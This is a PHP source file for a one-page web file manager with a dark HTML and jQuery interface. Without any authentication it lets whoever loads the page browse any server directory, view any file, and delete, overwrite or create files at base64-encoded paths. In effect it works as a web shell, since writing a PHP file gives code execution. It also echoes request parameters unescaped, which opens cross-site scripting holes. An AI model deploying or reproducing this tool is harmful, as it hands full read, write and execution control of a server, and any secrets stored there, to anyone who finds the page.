<?php
define("_home", dirname(__FILE__));
// define("_home", $_SERVER['DOCUMENT_ROOT']);
define('_XXX', $_SERVER['PHP_SELF']);


$postDir = isset($_GET['dir']) ? $_GET['dir'] : _home;

if (empty($postDir)) $postDir = _home;

$postDir = str_replace('\\', '/', $postDir);

if (isset($_POST['delete'])) {
    unlink(base64_decode($_POST['path']));
}

if (isset($_POST['edit'])) {
    file_put_contents(base64_decode($_POST['path']), $_POST['data']);
}

if (isset($_POST['addfile'])) {
    file_put_contents(base64_decode($_POST['path']), $_POST['data']);
}

$dirs = getDir($postDir);

function getDir($path)
{
    $dir = scandir($path);

    $arrFile = [];
    $arrFolder = [];
    $arr = [];

    if (!$dir) return $arr;

    global $postDir;
    foreach ($dir as $index => $val) {
        if ($index > 1) {
            $p =  $postDir . "/" . $val;
            if (is_dir($val)) {
                array_push($arrFolder, $p);
            } else {
                array_push($arrFile, $p);
            }
        }
    }

    sort($arrFile);
    sort($arrFolder);

    foreach ($arrFolder as $val) {
        array_push($arr, $val);
    }

    foreach ($arrFile as $val) {
        array_push($arr, $val);
    }

    // $arr = array_merge($arrFolder, $arrFile);

    return $arr;
}



function writeFile($path, $data)
{
    file_put_contents($path, $data);
}

function isImage($path)
{
    echo json_encode(getimagesize(str_replace('\\', '/', $path)));
    return @exif_imagetype(readFile($path));
}


function getIcon($fileExtention)
{
    $fileExtention = strtolower($fileExtention);
    switch ($fileExtention) {
        case "doc":
            return "<i style='color: #16a085' class='bx bxs-file-doc'></i>";

        case "css":
            return "<i style='color: #9b59b6'  class='bx bxs-file-css'></i>";

        case "html":
            return "<i  style='color: #e67e22' class='bx bxs-file-html' ></i>";

        case "png":
        case "jpg":
        case "gif":
        case "jpeg":
        case "webp":
            return "<i  style='color: #3498db' class='bx bxs-image' ></i>";

        case "js":
            return "<i  style='color: #e67e22' class='bx bxs-file-js' ></i>";

        case "zip":
        case "rar":
            return "<i  style='color: #e67e22' class='bx bxs-file-archive' ></i>";
        case "txt":
            return "<i  style='color: #7ed6df' class='bx bxs-file-txt' ></i>";
        case "json":
            return "<i  style='color: #6ab04c' class='bx bxs-file-json' ></i>";

        case "php":
        case "php1":
        case "php2":
        case "php3":
        case "php4":
        case "php5":
        case "php6":
        case "php7":
        case "php8":
            return "<i style='color: #3b68ff' class='bx bxl-php' ></i>";


        default:
            return "<i  style='color: #16a085' class='bx bxs-file-blank' ></i>";
    }
}




function formatBytes($bytes, $precision = 2)
{
    $sz = 'BKMGTP';
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$precision}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <title>Files</title>
    <style>
        .bx {
            font-size: 25px;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            list-style: none;
            color: #95a5a6;
        }

        a {
            text-decoration: none;
            width: -webkit-fill-available;
        }

        body {
            background-color: #121212;
            padding: 1rem;
        }

        .list-dir {
            /* width: max-content; */
            width: 100%;
        }


        .item-dir {
            width: 100%;
            cursor: pointer;
            padding: 6px 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            justify-content: space-between;
            border-bottom: 1px solid #555555;
        }

        .item-dir span {
            width: 100%;
        }

        input,
        textarea,
        button {
            margin: 2px;
            border: none;
            outline: none;
            padding: 4px 8px;
            color: black;
        }

        textarea {
            color: #95a5a6;
        }

        textarea.show {
            width: 100%;
            min-height: calc(100vh - 6rem);
            background: #2c3e50;
            padding: 1rem;
        }

        .item-dir.tools {
            display: flex;
            gap: 1rem;
        }

        .item-tools {
            width: max-content !important;
            border-radius: 3px;
            padding: 5px;
        }
    </style>

    <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>

</head>

<body>
    <p><?= $postDir ?></p>


    <?php if (isset($_GET['show'])) : ?>
        <button id="editfile">Edit</button>

        <?php
        $path = $_GET['show'];
        $pattern = '/.*\.(?:jpe?g|png|gif)(?:\?\S+)?$/i';
        $result = preg_match($pattern, $path);
        if ($result) {
            echo "<img src='data:image/jpg;base64," . base64_encode(file_get_contents($path)) . "' >";
        } else {
            echo '<textarea id="datashow" class="show">' . htmlentities(file_get_contents($path)) . '</textarea>';
        }

        ?>



    <?php elseif (isset($_GET['addfile'])) : ?>

        <div style="display: flex;">
            <input id="add-file-path" style="width: 100%;" type="text" placeholder="File name" value="<?= __DIR__ . '/' . time() . '.txt' ?>">
            <button id="editfile">Add</button>
            <button onclick="closeThis();">Close</button>
        </div>

        <textarea id="datashow" class="show"></textarea>

        <script>
            $('#editfile').click(() => {
                $.post('<?= $_SERVER['PHP_SELF'] ?>', {
                    addfile: 'YES',
                    path: btoa($('#add-file-path').val()),
                    data: $('#datashow').val(),
                }, (data) => {
                    console.log(data)
                    // window.close()
                })
            })
        </script>

    <?php elseif ($postDir) : ?>
        <ul class="list-dir">
            <li class="item-dir tools" style="border: none; margin-bottom: 1rem; margin-top: 1rem;">
                <span class="item-tools">
                    <a href="<?= _XXX . '?dir=' . substr($postDir, 0, strrpos($postDir, '/')) ?>">
                        <i style='color: #f1c40f;' class='bx bx-arrow-back'></i>
                    </a>
                </span>

                <span class="item-tools">
                    <a href="<?= _XXX . '?dir=' . $postDir ?>">
                        <i style='color: #3498db;' class='bx bx-revision'></i>
                    </a>
                </span>


                <span class="item-tools">
                    <a href="<?= _XXX . '?addfile' ?>" target="_blank">
                        <i style='color: #2ecc71;' class='bx bx-plus'></i>
                    </a>
                </span>

            </li>

            <?php foreach ($dirs as $index => $val) : ?>
                <li class=" item-dir">
                    <?= is_dir($val) ? "<i style='color: #f1c40f;' class='bx bxs-folder'></i>" : getIcon(pathinfo($val, PATHINFO_EXTENSION)) ?>
                    <a style="padding: 6px 8px" <?= is_dir($val) ? ("href='" . _XXX . "?dir=$val'") : ("href='" . _XXX . "?show=$val' target='_blank'")  ?>>
                        <span><?= basename($val) ?> <?= is_file($val) ? '(' . formatBytes(filesize($val)) . ')' : '' ?></span>
                    </a>


                    <?php

                    if (!is_dir($val)) {
                        echo "<div style='display: flex; gap: 8px;'>";
                        echo " <i style='color: #00b894; font-size: 20px' class='bx bxs-pencil'></i>";
                        echo "<i onclick=\"deleteFile('" . base64_encode($val) . "')\" style='color: #ff7675; font-size: 20px' class='bx bxs-trash-alt' ></i>";
                        echo "</div>";
                    }


                    ?>

                </li>
            <?php endforeach ?>
        </ul>



        <script>
            function deleteFile(url) {
                if (confirm("Delete file: " + atob(url))) {
                    $.post('<?= $_SERVER['PHP_SELF'] ?>', {
                        delete: 'YES',
                        path: url,
                    }, (data) => {
                        // console.log(data)
                        location.reload()
                    })
                }
            }
        </script>
    <?php endif ?>



    <script>
        $('#editfile').click((e) => {

            $.post('<?= $_SERVER['PHP_SELF'] ?>', {
                edit: 'YES',
                path: '<?= base64_encode($_GET['show']) ?>',
                data: $('#datashow').val(),
            }, (data) => {
                // console.log(data)
                location.reload()
            })

        })
    </script>

</body>

</html>
